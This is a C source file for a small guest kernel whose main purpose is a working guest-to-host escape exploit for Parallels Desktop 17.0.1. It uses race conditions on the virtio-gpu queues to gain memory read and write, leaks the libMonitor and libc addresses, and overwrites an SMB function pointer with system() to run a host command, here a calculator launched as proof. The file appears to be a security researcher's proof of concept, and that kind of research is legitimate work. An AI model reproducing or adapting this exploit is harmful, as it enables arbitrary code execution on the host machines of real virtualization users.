#include <stdio.h>
#include <pmm.h>
#include <trap.h>
#include <x86.h>
#include <picirq.h>
#include <clock.h>
#include <multiboot.h>
#include <heap.h>
#include <pci.h>
#include <keyboard.h>
#include <virtio_dev.h>
#include <physical_page.h>
#include <smp.h>
#include <virtio_gpu.h>
#include <virtio.h>
#include <smb.h>
#include <string.h>
void cga_init(){
    for(int i=0;i<80;i++){
        kprintf("\n");
    }
    set_cursor(0,0);
}

void intr_enable(){
    sti();
}

void intr_disable(){
    cli();
}


void kern_init(multiboot_info_t* mbd, unsigned int magic){
    extern char bss_start[],bss_end[];
    memset(bss_start,0,bss_end-bss_start);
    cga_init();
    pmm_init();
    pic_init(); // if not, os will stuck by int 13
    clock_init();
    keyboard_init();
    intr_init();

    heap_init((uint8_t*)0x200000,0x100000);

    physical_page_init((uint8_t*)0x300000,0x500000);
    intr_enable();

    pci_init();
    virtio_dev_install();
    smb_init();

    void bug_trigger();
    
    start_thread();
    kprintf(
        "\n\n\n\n\n"
        "System Boot UP\n"
        "press Key <a> to exploit Parallels Desktop 17.0.1\n"
        "$ "
    );
    while(1){
        char op = get_c();
        kprintf("\n");
        switch(op){
            case 'a':
                kprintf("exploit begin\n");
                bug_trigger();
                break;
        }
    }
}


void helloworld(){
    kprintf("output helloworld\n");
}
void create_task(void (*p)(void*),void* arg){
    task = p;
    task_arg = arg;
    UNLOCK(taskLock);
    while(task){
        cpu_relax();
    }
    LOCK(taskLock);
}

struct virtio_gpu_update_cursor ppp;
struct shr_info{
    uint32_t done;
    uint32_t mem;
    uint32_t offset;
};
struct shr_1{
    uint64_t addr;
    uint64_t *ptr;
    uint32_t done;
};

struct queue_result {
    uint32_t next_buf;
    uint32_t buf_count;
    struct {
        uint64_t hva;
        uint64_t gpa;
        uint64_t length;
    } mem_handlers[3];
    uint64_t idx_1_addr;
    uint64_t idx_1_length;
    uint64_t output_gpa;
    uint64_t output_length;
};

void overwrite_dword(void* ptr);
void race_write(void* ptr);
extern virtio_device* gpu_dev;
uint64_t read_qword(struct queue_result* qr,uint64_t addr);
void write_qword(struct queue_result* qr,uint64_t dst_addr,uint64_t value);
void race_write2(void* ptr);

void bug_trigger(){
    virtio_device* vdev = gpu_dev;
    virtq_desc desc;
    memset(&ppp,'a',sizeof(ppp));
    // kprintf("ppp addr: %x\n",&ppp);
    struct shr_info info;
    memset(&info,0,sizeof(info));
    info.done = 0;
    info.offset = 4651; // queue result high ptr
    info.mem = (uint32_t)&ppp.pos.scanout_id;
    uint64_t fake_hva = 0x180000000;
    create_task(overwrite_dword,&info);
    for(int i=0;i<0x100;i++){
        ppp.pos.scanout_id = 0;
        ppp.hdr.type = 0x300;
        ppp.resource_id = fake_hva>>32; // 0x1f0000000 <- maybe guest memory
        desc.flags = 0;
        desc.address = (uint32_t)&ppp;
        desc.length = sizeof(ppp);
        virtio_fill_buffer(vdev,1,&desc,1,0); // don't copy
    }
    info.done = 1;
    while(info.done != -1){
        cpu_relax();
    }

    info.done = 0;
    info.offset = 4650;
    create_task(overwrite_dword,&info);

    for(int i=0;i<0x100;i++){
        ppp.pos.scanout_id = 0;
        ppp.hdr.type = 0x300;
        ppp.resource_id = fake_hva&0xffffffff; // 0x1f0000000 <- maybe guest memory
        desc.flags = 0;
        desc.address = (uint32_t)&ppp;
        desc.length = sizeof(ppp);
        virtio_fill_buffer(vdev,1,&desc,1,0); // don't copy
    }
    info.done = 1;
    while(info.done != -1){
        cpu_relax();
    }
    // kprintf("overwrite control queue result addr done, check now\n");
    // find the target addr in memory
    uint32_t search_ptr = 0x01000000;
    uint32_t search_end = 0xb0000000;
    uint64_t guest_base = 0;
    while(search_ptr < search_end){
        if(*(uint32_t*)search_ptr == 0xfffffffe){
            kprintf("find target addr at: 0x%x\n",search_ptr);
            guest_base = fake_hva - (uint64_t)search_ptr;
            break;
        }
        search_ptr += 0x1000;
    }
    if(search_ptr == search_end){
        kprintf("can't find target addr\n");
        return;
    }
    kprintf("VM base addr: 0x%x",guest_base>>32);
    kprintf("%x\n",guest_base);
    // kprintf("press key to continue...");
    // get_c();
    kprintf("leaking address...");
    struct queue_result* qr = (struct queue_result*)search_ptr;
    // uint64_t leak_ptr = guest_base + 0x100000000;
    // uint64_t leak_ptr_end = guest_base + 0x100000000 + 0x20000;
    /*
    0xfffff000<-----0x77a000 |---Guest Memory---| 0x100000-----> 0xfffff000
    4G memory
    */
    // find libMonitor.dylib
    uint64_t left_addr = guest_base - 0x77a000;
    uint64_t right_addr = guest_base + 0x100000000;
    int offset = 0;
    uint64_t leak_addr;
    while(1){
        // while(leak_ptr < leak_ptr_end){
        /* read addr */
        // kprintf("offset : %d\n",offset);
        if (offset % 2){
            leak_addr = left_addr - (offset/2)*0x1000;
        }else{
            leak_addr = right_addr + (offset/2)*0x1000;
        }
        offset+=2;
        uint64_t value = read_qword(qr,leak_addr + 0x4D10);
        if((value&0xffffffff) == 0x53415241){
            break;
        }
        if(offset % 0x300 == 0){
            kprintf(".");
            // uint64_t a = left_addr - (offset/2)*0x1000;
            // uint64_t b = right_addr + (offset/2)*0x1000;
            // kprintf("left addr: %x",a>>32);
            // kprintf("%x\n",a);
            // kprintf("right addr: %x",b>>32);
            // kprintf("%x\n",b);
        }
    }
    kprintf("\nlibMonitor addr: %x",leak_addr>>32);
    kprintf("%x\n",leak_addr);
    uint64_t libmonitor_addr = leak_addr;
    uint64_t leak_p = read_qword(qr,libmonitor_addr + 0x118150);
    // kprintf("leak_p: %x",leak_p>>32);
    // kprintf("%x\n",leak_p);
    // leak libc gettimeday 0x0000000000010b84
    // system 0x0000000000078d1d
    // search libMonitor.dylib base address

    uint64_t libc_base = leak_p - 0x0000000000010b84;
    kprintf("libc base: %x",libc_base>>32);
    kprintf("%x\n",libc_base);
    // kprintf("ready to write qword\n");
    // ddd();
    //overwrite smb pointer 
    struct __attribute__((__packed__)) {
        char opcode;
        char cmd[0x4f];
        uint64_t func_ptr;
    }smb_unit;
    smb_unit.func_ptr = libc_base + 0x0000000000078d1d;
    strcpy(smb_unit.cmd,"/System/Applications/Calculator.app/Contents/MacOS/Calculator");
    smb_unit.opcode = 0x20;
    uint64_t dst_value = (uint64_t)(uint32_t)&smb_unit;
    dst_value += guest_base;
    // overwrite queue result to smb
    write_qword(qr,libmonitor_addr + 0x151700 + 0xf4000,dst_value);
    kprintf("write qword success\n");
    // ddd();

    virtq_desc exp[3];
    exp[0].address = (uint64_t)(uint32_t)&smb_unit;
    exp[0].length = sizeof(smb_unit);
    exp[0].flags = 0;
    exp[1].address = (uint64_t)(uint32_t)&smb_unit;
    exp[1].length = sizeof(smb_unit);
    exp[1].flags = 0;
    exp[2].address = (uint64_t)(uint32_t)&smb_unit;
    exp[2].length = sizeof(smb_unit);
    exp[2].flags = 0;
    virtio_fill_buffer(vdev,0,exp,3,0);
    babysleep(100);
    kprintf("pop a calc\n");
    // ddd();
    outb(0xe200+0x4,0x40);
    outb(0xe200+2,0x40|(6<<2));
}

char bigbuffer[0x10000];
uint64_t read_qword(struct queue_result* qr,uint64_t leak_addr){
    virtio_device* vdev = gpu_dev;
    virt_queue* queue = &vdev->queue[0];
    virtq_desc desc2[3];
    
    struct shr_1 sh1;
    qr->mem_handlers[0].hva = 0;
    // memset(buffer,'a',sizeof(buffer));
    for(int i=0;;i++){
        sh1.done = 0;
        sh1.addr = leak_addr - 4;
        sh1.ptr = &qr->mem_handlers[0].hva;
        create_task(race_write,&sh1);
        desc2[0].address = (uint32_t)bigbuffer;
        desc2[0].flags = 0;
        desc2[0].length = 0x100;
        desc2[1].address = (uint32_t)bigbuffer;
        desc2[1].flags = 0;
        desc2[1].length = 0x100;
        desc2[2].address = (uint32_t)bigbuffer;
        desc2[2].flags = 2; // write flag
        desc2[2].length = 0x10000;
        uint32_t* tmp_ptr = (uint32_t*)&bigbuffer[4];
        *tmp_ptr = 0x61616161;

        int old_idx = queue->used->index;
        virtio_fill_buffer(vdev,0,desc2,3,0);
        while(old_idx == queue->used->index){
            cpu_relax();
        }
        //TODO lock for race
        if(sh1.done != 2){
            sh1.done = 1;
            while(sh1.done != 2){
                cpu_relax();
            }
        }
        if(*tmp_ptr != 0x61616161){
            return *(uint64_t*)tmp_ptr;
        }
    }

}

void write_qword(struct queue_result* qr,uint64_t dst_addr,uint64_t value){
    virtio_device* vdev = gpu_dev;
    virt_queue* queue = &vdev->queue[0];
    virtq_desc desc2[3];
    char buffer[0x100];
    struct shr_1 sh1;
    char dst_buf[0x18];
    memset(buffer,'c',sizeof(buffer));
    memcpy(&buffer[4],&value,8);
    for(int i=0;;i++){
        sh1.done = 0;
        sh1.addr = dst_addr - 4;
        sh1.ptr = &qr->mem_handlers[2].hva;
        
        create_task(race_write2,&sh1);
        // babysleep(100);
        desc2[0].address = (uint32_t)buffer;
        desc2[0].flags = 0;
        desc2[0].length = sizeof(buffer);
        desc2[1].address = (uint32_t)buffer;
        desc2[1].flags = 0;
        desc2[1].length = sizeof(buffer);
        desc2[2].address = (uint32_t)dst_buf;
        desc2[2].flags = 2; // write flag
        desc2[2].length = sizeof(dst_buf);
        // int i = 0;
        for(int ii=0;ii<0x1000;ii++){
            uint16_t old_idx = queue->used->index;
            *(uint32_t*)dst_buf = 0x0;
            virtio_fill_buffer(vdev,0,desc2,3,0);
            while(queue->used->index == old_idx){
                cpu_relax();
            }
            if(*(uint32_t*)dst_buf != 0x1200){
                break;
            }
        }
        sh1.done = 1;
        while(sh1.done != 2){
            cpu_relax();
        }
        if(*(uint32_t*)dst_buf != 0x1200){
            break;
        }
    }
}


void overwrite_dword(void* ptr){
    struct shr_info* info = ptr;
    while(!info->done){
        uint32_t* v = (uint32_t*)info->mem;
        uint32_t offset = info->offset;
        for(int i=0;i<0x100 && !info->done;i++){
            *v = 0;
            *v = offset;
        }
    }
    info->done = -1;
}

void race_write(void* ptr){
    // kprintf("do job\n");
    struct shr_1* sh = (struct shr_1*)ptr;
    uint8_t* v = (uint8_t*)sh->ptr;
    // kprintf("watch address: %x\n",v);
    while(!*v && !sh->done){
        cpu_relax();
    }
    *sh->ptr = sh->addr;
    // kprintf("race write success\n");
    sh->done = 2;
    // kprintf("job done\n");
}
void race_write2(void* ptr){
    // kprintf("do job\n");
    struct shr_1* sh = (struct shr_1*)ptr;
    uint8_t* v = (uint8_t*)sh->ptr;
    // kprintf("watch address: %x\n",v);
    while(sh->done == 0){
        while(!*v && !sh->done){
            cpu_relax();
        }
        *sh->ptr = sh->addr;
    }
    sh->done = 2;


}

void ddd(){
    while(get_c() !='a');
}

